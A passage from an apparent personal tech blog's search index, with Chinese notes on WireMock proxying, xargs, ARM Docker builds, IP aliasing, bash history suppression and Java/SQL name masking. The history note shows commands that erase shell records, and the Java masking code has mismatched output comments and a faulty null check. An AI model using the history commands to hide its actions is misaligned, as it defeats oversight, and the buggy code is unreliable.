target=\"_blank\" rel=\"noopener\">資料夾怪怪的,不能即時更新 - 其他應用軟體 - 電腦討論區 - Mobile01</a></p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">這個問題發生很久了.</span><br><span class=\"line\">想說爬文解決.結果爬到這篇.</span><br><span class=\"line\"></span><br><span class=\"line\">不過昨天試了一個方法.</span><br><span class=\"line\">可以解決此問題.</span><br><span class=\"line\"></span><br><span class=\"line\">1.開 C 槽</span><br><span class=\"line\">2.組合管理 - 資料夾搜尋選項</span><br><span class=\"line\"></span><br><span class=\"line\">進去後. 全部還原成預設值. 就好了.</span><br><span class=\"line\"></span><br><span class=\"line\">每個槽都要做一次.</span><br><span class=\"line\"></span><br><span class=\"line\">因為我全部都做了.來不及比對差在那裡</span><br><span class=\"line\">如果大家試有效.可以幫忙比對一下. 是那個選項造成的.</span><br></pre></td></tr></table></figure>\n<p>真的有用，筆記筆記</p>\n","categories":["維修小記"],"tags":["windows"]},{"title":"wiremock 反向代理方法","url":"/blog/2021/03/31/wiremock-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/","content":"<p>最近寫好 mock api 完後，剛好開發環境也完成了<br>想直接在本機測試<br>想說 wiremock 有沒有反向代理方法<br>結果還真的有耶!!</p>\n<a id=\"more\"></a>\n<p>先前文章有用過</p>\n<p><a href=\"http://wiremock.org/docs/proxying/\" target=\"_blank\" rel=\"noopener\">Proxying - WireMock</a></p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"request\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"method\"</span>: <span class=\"string\">\"ANY\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"urlPattern\"</span>: <span class=\"string\">\"/project/.*\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">\"response\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"proxyBaseUrl\"</span> : <span class=\"string\">\"http://localhost:8080/\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://wiremock.org/docs/stubbing/\" target=\"_blank\" rel=\"noopener\">Stubbing - WireMock</a></p>\n<blockquote>\n<p>HTTP methods currently supported are: GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS. You can specify ANY if you want the stub mapping to match on any request method.</p>\n</blockquote>\n<p>未來有空來寫寫看 Rand 非特定字串(如:UUID,TOKEN之類的)</p>\n<h2 id=\"Rand\"><a href=\"#Rand\" class=\"headerlink\" title=\"Rand\"></a>Rand</h2><p><a href=\"http://wiremock.org/docs/response-templating/\" target=\"_blank\" rel=\"noopener\">http://wiremock.org/docs/response-templating/</a></p>\n","categories":["實用工具"],"tags":["java","mockapi","wiremock"]},{"title":"xargs 參數代換簡單使用筆記","url":"/blog/2018/08/18/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","content":"<p>最近做<code>find . -mmin -60 |  ls -l</code>發現怎麼不能讀ls內容<br>原來我以為 <code>|</code>pipe 就是把輸出結果加到後面去<br>但是並非跟<code>&lt;,&lt;&lt;</code>一樣<br>所以我在stackoverflow找到<a href=\"https://stackoverflow.com/questions/18210956/unix-pipe-into-ls\" target=\"_blank\" rel=\"noopener\">linux - Unix pipe into ls - Stack Overflow</a><br>要使用xargs<br>不過我真的對這個不太熟</p>\n<a id=\"more\"></a>\n<p>相關資料流重新導向可以看<a href=\"http://linux.vbird.org/linux_basic/0320bash.php#redirect\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH</a><br><a href=\"/blog/2018/08/18/xargs-參數代換簡單使用筆記/Wang_web.png\" title=\"上面連結備份圖\">上面連結備份圖</a></p>\n<p>xargs網路有爬到<a href=\"https://blog.gtwang.org/linux/xargs-command-examples-in-linux-unix/\" target=\"_blank\" rel=\"noopener\">Linux 系統 xargs 指令範例與教學 - G. T. Wang</a>講解非常清楚</p>\n<p>這邊我就簡單紀錄看起來很常用的指令</p>\n<p><code>xargs</code> 在指令輸入<br>可以接著輸入很多東西<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">a b c</span><br><span class=\"line\">def</span><br></pre></td></tr></table></figure></p>\n<p>再按<code>Ctrl+d</code>可以看到螢幕輸出<code>a b c def</code></p>\n<h2 id=\"xargs簡單小試\"><a href=\"#xargs簡單小試\" class=\"headerlink\" title=\"xargs簡單小試\"></a>xargs簡單小試</h2><p><code>xargs ls</code><br>再輸入<code>.</code><br>再按下<code>Ctrl+D</code><br>可以跳出</p>\n<p>所以我們<code>find . -mmin -60 |  ls -l</code>這段<br>要改成<code>find . -mmin -60 | xargs  ls -l</code></p>\n<h2 id=\"執行前的確認\"><a href=\"#執行前的確認\" class=\"headerlink\" title=\"執行前的確認\"></a>執行前的確認</h2><p><code>-p</code>會問要不要執行這個參數<br>echo a b c d e f| xargs -p</p>\n<h2 id=\"實用指令\"><a href=\"#實用指令\" class=\"headerlink\" title=\"實用指令\"></a>實用指令</h2><p>參考<a href=\"https://blog.gtwang.org/linux/xargs-command-examples-in-linux-unix/\" target=\"_blank\" rel=\"noopener\">Linux 系統 xargs 指令範例與教學 - G. T. Wang</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -name <span class=\"string\">'*.c'</span> | xargs grep <span class=\"string\">'stdlib.h'</span></span><br></pre></td></tr></table></figure></p>\n<p>輸出結果<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">./CMake/TestOggTheoraSubsampling.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/lex.yy.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkWrapPythonInit.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkWrapTcl.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkWrapTclInit.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkParsePreprocess.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkWrapText.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkParseData.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkParseHierarchy.c:#include &lt;stdlib.h&gt;</span><br><span class=\"line\">./Wrapping/Tools/vtkParseMain.c:#include &lt;stdlib.h&gt;</span><br></pre></td></tr></table></figure></p>\n<p>這個指令感覺很實用</p>\n","categories":["Linux"],"tags":["linux","xargs"]},{"title":"x86 機器 build arm Docker Image 方法","url":"/blog/2021/03/28/x86-%E6%A9%9F%E5%99%A8-build-arm-Docker-Image-%E6%96%B9%E6%B3%95/","content":"<p>最近要build arm image<br>但是…在Raspberry Pi build 的時間非常久<br>在想x86有沒有辦法做到<br>結果真得可以</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update &amp;&amp; sudo apt-get install -y --no-install-recommends qemu-user-static binfmt-support</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://learningsky.io/docker-build-on-ubuntu-x86/\" target=\"_blank\" rel=\"noopener\">【 Solutions 】解決在 x86 環境下無法 Build ARM 的 Docker Image</a></p>\n<p>試著build 一個Raspberry Pi image 沒有什麼問題</p>\n","categories":["Docker"],"tags":["docker"]},{"title":"不留這次Linux bash 歷史記錄的方法","url":"/blog/2018/07/02/%E4%B8%8D%E7%95%99%E9%80%99%E6%AC%A1Linux-bash-%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>有時因為要測試指令<br>會大量留下不能用的指令到history上面<br>今天就搜尋一下，發現<a href=\"https://xyz.cinc.biz/2017/08/linux-bash-history-clear.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄</a><br>有講要怎麼清除，有測試成功!!!</p>\n<a id=\"more\"></a>\n<p><strong> 以下擷取<a href=\"https://xyz.cinc.biz/2017/08/linux-bash-history-clear.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄</a> </strong></p>\n<blockquote>\n<p>只刪除這次登入後的操作紀錄：<br>方法一：清空 HISTFILE 變數內容，則登出時，不會將本次操作紀錄儲存到 HISTFILE 設定的檔案。</p>\n</blockquote>\n<pre><code># unset HISTFILE\n</code></pre><p>方法二：將 HISTSIZE 設為0，下「history」指令時，也不會列出指令(記憶體中沒存放指令紀錄?)，則登出時，不會更新記錄檔內容(?)。<br>(註：參考資料是寫會刪除全部紀錄，但我測試是只有不會儲存本次操作紀錄)</p>\n<pre><code># HISTSIZE=0\n</code></pre><p> 方法三：強制刪除本次登入 Bash 的 PID，則本次操作紀錄，不會儲存到記錄檔。</p>\n<pre><code># kill -9 $$\n</code></pre><p>感覺最實用是方法3<code>kill -9 $$</code></p>\n<p>清除所有history發法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># history -c</span><br><span class=\"line\"># history -w</span><br></pre></td></tr></table></figure></p>\n<p>詳細可以去看一下鳥哥<br><a href=\"http://linux.vbird.org/linux_basic/0320bash.php#history\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH</a></p>\n<p>另外還有HISTCONTROL方法<br><a href=\"https://ez3c.tw/1717\" target=\"_blank\" rel=\"noopener\">Linux Bash環境下，輸入指令不留痕跡的作法 :: 哇哇3C日誌</a></p>\n<p>今天還看到HISTORY可以用Ctrl+R 找過去打的指令<br><a href=\"https://blog.gtwang.org/linux/mastering-linux-command-line-history/\" target=\"_blank\" rel=\"noopener\">Linux 指令歷史紀錄（History）的操作教學與範例 - G. T. Wang</a></p>\n<p>參考來源:<br><a href=\"https://xyz.cinc.biz/2017/08/linux-bash-history-clear.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄</a><br><a href=\"http://linux.vbird.org/linux_basic/0320bash.php#history\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH</a><br><a href=\"https://ez3c.tw/1717\" target=\"_blank\" rel=\"noopener\">Linux Bash環境下，輸入指令不留痕跡的作法 :: 哇哇3C日誌</a><br><a href=\"https://blog.gtwang.org/linux/mastering-linux-command-line-history/\" target=\"_blank\" rel=\"noopener\">Linux 指令歷史紀錄（History）的操作教學與範例 - G. T. Wang</a></p>\n","categories":["Linux"],"tags":["linux","bash","history"]},{"title":"中文姓名遮罩和判斷字串有中英文方法","url":"/blog/2021/01/07/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/","content":"<p>網路收集幾個方法</p>\n<a id=\"more\"></a>\n<h2 id=\"判斷中英文方法\"><a href=\"#判斷中英文方法\" class=\"headerlink\" title=\"判斷中英文方法\"></a>判斷中英文方法</h2><p><a href=\"https://blog.csdn.net/qinyuezhan/article/details/82995968\" target=\"_blank\" rel=\"noopener\">判断字符串是否纯中文、英文、数字、等等_心丨悦 的专栏-CSDN博客</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">isEnglish</span><span class=\"params\">(String str)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//【全为英文】返回true  否则false</span></span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> result1 = str.matches(<span class=\"string\">\"[a-zA-Z]+\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//【全为数字】返回true</span></span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> result6 = str.matches(<span class=\"string\">\"[0-9]+\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//【除英文和数字外无其他字符(只有英文数字的字符串)】返回true 否则false</span></span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> result2 = str.matches(<span class=\"string\">\"[a-zA-Z0-9]+\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//【含有英文】true</span></span><br><span class=\"line\">    String regex1 = <span class=\"string\">\".*[a-zA-z].*\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> result3 = str.matches(regex1);</span><br><span class=\"line\">    <span class=\"comment\">//【含有数字】true</span></span><br><span class=\"line\">    String regex2 = <span class=\"string\">\".*[0-9].*\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> result4 = str.matches(regex2);</span><br><span class=\"line\">    <span class=\"comment\">//判断是否为纯中文，不是返回false</span></span><br><span class=\"line\">    String regex3 = <span class=\"string\">\"[\\\\u4e00-\\\\u9fa5]+\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> result5 = str.matches(regex3);</span><br><span class=\"line\">    System.out.println(result1 + <span class=\"string\">\"--\"</span> + result2 + <span class=\"string\">\"--\"</span> + result3</span><br><span class=\"line\">            + <span class=\"string\">\"--\"</span> + result4 + <span class=\"string\">\"--\"</span> + result5 + <span class=\"string\">\"--\"</span> + result6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"中英文姓名判斷\"><a href=\"#中英文姓名判斷\" class=\"headerlink\" title=\"中英文姓名判斷\"></a>中英文姓名判斷</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        String id = <span class=\"string\">\"A123456789\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(maskName(<span class=\"string\">\"黃藥師\"</span>)); <span class=\"comment\">// A1*****789</span></span><br><span class=\"line\">        System.out.println(maskName(<span class=\"string\">\"Hello World\"</span>)); <span class=\"comment\">// A1234*****</span></span><br><span class=\"line\">        System.out.println(maskName(<span class=\"string\">\"Huang d\"</span>)); <span class=\"comment\">// ####456789</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">maskName</span><span class=\"params\">(String name)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        String result = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isEnglish(name)) &#123;</span><br><span class=\"line\">            result = mask(name, <span class=\"number\">2</span>, name.length()-<span class=\"number\">3</span>, <span class=\"string\">'*'</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            result = mask(name, <span class=\"number\">1</span>, name.length()-<span class=\"number\">2</span>, <span class=\"string\">'*'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">//判断是不是英文字母</span></span><br><span class=\"line\">     <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isEnglish</span><span class=\"params\">(String charaString)</span> </span>&#123;</span><br><span class=\"line\">         <span class=\"keyword\">if</span>( charaString == <span class=\"keyword\">null</span> &amp;&amp; <span class=\"string\">\"\"</span>.equals(charaString))&#123;</span><br><span class=\"line\">             <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> charaString.substring(<span class=\"number\">0</span>,<span class=\"number\">1</span>).matches(<span class=\"string\">\"^[a-zA-Z]*\"</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 字串遮罩</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> text 原始字串</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> start 遮罩起始位置index</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> length 遮罩長度</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> maskSymbol 遮罩符號</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> 遮罩過的字串</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">mask</span><span class=\"params\">(String text, <span class=\"keyword\">int</span> start, <span class=\"keyword\">int</span> length, <span class=\"keyword\">char</span> maskSymbol)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (text == <span class=\"keyword\">null</span> || text.isEmpty()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (start &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            start = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (length &lt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> text;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        <span class=\"keyword\">char</span>[] cc = text.toCharArray();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; cc.length; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (i &gt;= start &amp;&amp; i &lt; (start + length)) &#123;</span><br><span class=\"line\">                sb.append(maskSymbol);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                sb.append(cc[i]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>遮罩長度可以改</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">maskName</span><span class=\"params\">(String name)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    String result = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isEnglish(name)) &#123;</span><br><span class=\"line\">        result = mask(name, <span class=\"number\">2</span>, name.length()-<span class=\"number\">3</span> &gt; <span class=\"number\">8</span> ? <span class=\"number\">8</span> : name.length()-<span class=\"number\">3</span> , <span class=\"string\">'*'</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        result = mask(name, <span class=\"number\">1</span>, name.length()-<span class=\"number\">2</span> &gt; <span class=\"number\">8</span> ? <span class=\"number\">8</span> : name.length()-<span class=\"number\">2</span> , <span class=\"string\">'o'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"sql-判斷方法\"><a href=\"#sql-判斷方法\" class=\"headerlink\" title=\"sql 判斷方法\"></a>sql 判斷方法</h3><p><a href=\"http://www.htsjk.com/shujukunews/3544.html\" target=\"_blank\" rel=\"noopener\">oracle 判断字符是否为字母，oracle字符_数据库前沿资讯 | 和通数据库</a><br><a href=\"https://stackoverflow.com/questions/19046824/how-to-mask-characters-with-x-in-a-varchar2-field-in-oracle-sql\" target=\"_blank\" rel=\"noopener\">How to mask characters with X in a varchar2 field in Oracle SQL - Stack Overflow</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--- postgressql</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">substr</span>(a.name,<span class=\"number\">1</span>,<span class=\"number\">2</span>)|| <span class=\"keyword\">repeat</span>(<span class=\"string\">'*'</span>,<span class=\"keyword\">length</span>(a.name)<span class=\"number\">-2</span>)|| <span class=\"keyword\">substr</span>(a.name,<span class=\"keyword\">length</span>(a.name)<span class=\"number\">-1</span>,<span class=\"number\">2</span>),a.name,<span class=\"keyword\">ascii</span>(<span class=\"keyword\">substring</span>(a.name,<span class=\"number\">1</span>,<span class=\"number\">1</span>)) <span class=\"keyword\">between</span> <span class=\"number\">65</span> <span class=\"keyword\">and</span> <span class=\"number\">122</span>,</span><br><span class=\"line\"><span class=\"keyword\">CASE</span> <span class=\"keyword\">WHEN</span> <span class=\"keyword\">ascii</span>(<span class=\"keyword\">substring</span>(a.name,<span class=\"number\">1</span>,<span class=\"number\">1</span>)) <span class=\"keyword\">between</span> <span class=\"number\">65</span> <span class=\"keyword\">and</span> <span class=\"number\">122</span> <span class=\"keyword\">then</span> </span><br><span class=\"line\"> <span class=\"keyword\">substr</span>(a.name,<span class=\"number\">1</span>,<span class=\"number\">2</span>)|| <span class=\"keyword\">repeat</span>(<span class=\"string\">'*'</span>,<span class=\"keyword\">length</span>(a.name)<span class=\"number\">-3</span>)|| <span class=\"keyword\">substr</span>(a.name,<span class=\"number\">-1</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\"> <span class=\"keyword\">substr</span>(a.name,<span class=\"number\">1</span>,<span class=\"number\">1</span>)|| <span class=\"keyword\">repeat</span>(<span class=\"string\">'*'</span>,<span class=\"keyword\">length</span>(a.name)<span class=\"number\">-2</span>)|| <span class=\"keyword\">substr</span>(a.name,<span class=\"number\">-1</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">end</span> <span class=\"keyword\">as</span> mask_name,<span class=\"keyword\">length</span>(a.name)</span><br><span class=\"line\"><span class=\"keyword\">from</span> <span class=\"keyword\">account</span>  a</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--oracle</span></span><br><span class=\"line\">        <span class=\"keyword\">select</span> <span class=\"keyword\">substr</span>(full_name,<span class=\"number\">1</span>,<span class=\"number\">5</span>) || regexp_replace(<span class=\"keyword\">substr</span>(full_name,<span class=\"number\">6</span>,<span class=\"number\">5</span>), <span class=\"string\">'[^ ]'</span>, <span class=\"string\">'X'</span>) ||</span><br><span class=\"line\">       <span class=\"keyword\">substr</span>(full_name,<span class=\"number\">11</span>,<span class=\"number\">5</span>) || regexp_replace(<span class=\"keyword\">substr</span>(full_name,<span class=\"number\">16</span>,<span class=\"number\">5</span>), <span class=\"string\">'[^ ]'</span>, <span class=\"string\">'X'</span>) ||</span><br><span class=\"line\">       <span class=\"keyword\">substr</span>(full_name,<span class=\"number\">21</span>,<span class=\"number\">5</span>) || regexp_replace(<span class=\"keyword\">substr</span>(full_name,<span class=\"number\">26</span>,<span class=\"number\">5</span>), <span class=\"string\">'[^ ]'</span>, <span class=\"string\">'X'</span>) <span class=\"keyword\">as</span> masked_name</span><br><span class=\"line\"><span class=\"keyword\">from</span></span><br><span class=\"line\">(  </span><br><span class=\"line\">  <span class=\"keyword\">select</span> <span class=\"string\">'Tristram Vladimir Chan '</span> <span class=\"keyword\">as</span> full_name <span class=\"keyword\">from</span> dual</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>","categories":["Java"],"tags":["java"]},{"title":"一張網卡使用多組 IP 方法","url":"/blog/2020/05/30/%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95/","content":"<p>故事是這樣的，最近我們公司有多個專案，聽到都是放在獨立機器，各自一組IP。<br>最近我不小心 FTP 設定錯 IP，但是上傳檔案上去。發現 http server(IP對的)竟然更新了。<br>我覺得很奇怪不是不同台電腦，後來發現那一台設定很多虛擬 IP。<br><del>讓我們研究公司是如何省錢的</del></p>\n<p>其實這個用途看到用一台電腦需要跨網段使用<br>不需要切換 IP<br>但不知道數量是不是有限制<br>用台多會不會有缺點?</p>\n<a id=\"more\"></a>\n<p>這名詞叫 IP Alias<br><a href=\"http://linux.vbird.org/linux_server/0230router.php#routing_ip_alias\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 架設 Router</a></p>\n<h2 id=\"window\"><a href=\"#window\" class=\"headerlink\" title=\"window\"></a>window</h2><p>很簡單，去控制台設定，自動 dhcp 要先取消掉</p>\n<img src=\"/blog/2020/05/30/一張網卡使用多組-IP-方法/window_ip.png\" title=\"設定多組 IP\">\n<h2 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h2><h3 id=\"簡單設定\"><a href=\"#簡單設定\" class=\"headerlink\" title=\"簡單設定\"></a>簡單設定</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo ifconfig wlp3s0:0 192.168.0.1              </span><br><span class=\"line\"></span><br><span class=\"line\">ifconfig wlp3s:0 down</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重新匯入網路</span></span><br><span class=\"line\">sudo /etc/init.d/networking restart </span><br><span class=\"line\"><span class=\"comment\"># 這邊我是用下面這個才成功</span></span><br><span class=\"line\">service network-manager restart</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://linux.vbird.org/linux_server/0140networkcommand.php\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – Linux 常用網路指令介紹</a></p>\n<p>查看狀態<code>ip -4 a</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">3: wlp3s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class=\"line\">    inet 192.168.1.117/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp3s0</span><br><span class=\"line\">       valid_lft 76153sec preferred_lft 76153sec</span><br><span class=\"line\">    inet 192.168.1.150/24 brd 192.168.1.255 scope global secondary wlp3s0:0</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n<h3 id=\"永久加入設定\"><a href=\"#永久加入設定\" class=\"headerlink\" title=\"永久加入設定\"></a>永久加入設定</h3><p>$ /etc/network/interfaces 檔案加入下列內容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\">iface enp0s25 inet static</span><br><span class=\"line\">address 192.168.1.168</span><br><span class=\"line\">netmask 255.255.255.0</span><br><span class=\"line\">gateway 192.168.1.254</span><br><span class=\"line\"></span><br><span class=\"line\">### 新增第二筆網卡設定</span><br><span class=\"line\"></span><br><span class=\"line\">auto enp0s25:0 inet static   </span><br><span class=\"line\">address 192.168.1.169</span><br><span class=\"line\">netmask 255.255.255.0</span><br><span class=\"line\">gateway 192.168.1.254</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://medium.com/@frank.yylin/ubuntu-%E5%96%AE%E7%B6%B2%E5%8D%A1%E7%B6%81%E5%A4%9Aip-d69dc755efb0\" target=\"_blank\" rel=\"noopener\">[Ubuntu] 單網卡綁多IP - Frank Lin - Medium</a></p>\n<p>然後透過 bind port 各自綁多台 IP<br>這樣就能一台當多台用了</p>\n<p><a href=\"https://xyz.cinc.biz/2020/12/linux-add-secondary-ip-to-one-interface.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Linux 網卡新增多個IP</a></p>\n<h3 id=\"其他-OS-設定方法\"><a href=\"#其他-OS-設定方法\" class=\"headerlink\" title=\"其他 OS 設定方法\"></a>其他 OS 設定方法</h3><p><a href=\"https://blog.gtwang.org/linux/centos-linux-static-network-configuration-tutorial/\" target=\"_blank\" rel=\"noopener\">CentOS Linux 靜態 IP 位址網路設定教學 - G. T. Wang</a><br><a href=\"https://blog.toright.com/posts/6293/ubuntu-18-04-%E9%80%8F%E9%81%8E-netplan-%E8%A8%AD%E5%AE%9A%E7%B6%B2%E8%B7%AF%E5%8D%A1-ip.html\" target=\"_blank\" rel=\"noopener\">Ubuntu 18.04 透過 netplan 設定網路卡 IP - Soul &amp; Shell Blog</a></p>\n<h2 id=\"使用上設定防火牆陷阱\"><a href=\"#使用上設定防火牆陷阱\" class=\"headerlink\" 